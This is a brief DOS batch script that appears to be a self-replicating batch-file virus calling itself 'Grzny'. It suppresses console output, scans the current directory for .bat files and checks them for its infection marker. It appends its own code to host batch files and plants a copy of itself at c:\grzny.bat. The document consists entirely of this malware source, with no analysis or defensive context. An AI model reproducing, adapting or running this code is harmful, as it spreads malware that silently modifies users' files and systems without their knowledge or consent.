   @Echo off
   @ctty nul
   for %%a in (*?.b?t) do set Grzny= %%a
   for %%b in (*?.b?t) do find "Grzny" %%b
   if not errorlevel 1 goto grzny
   for %%c in (*?.b?t) do copy %%c+%0
   :grzny
   if not exist c:\grzny.bat copy %0 c:\grzny.bat
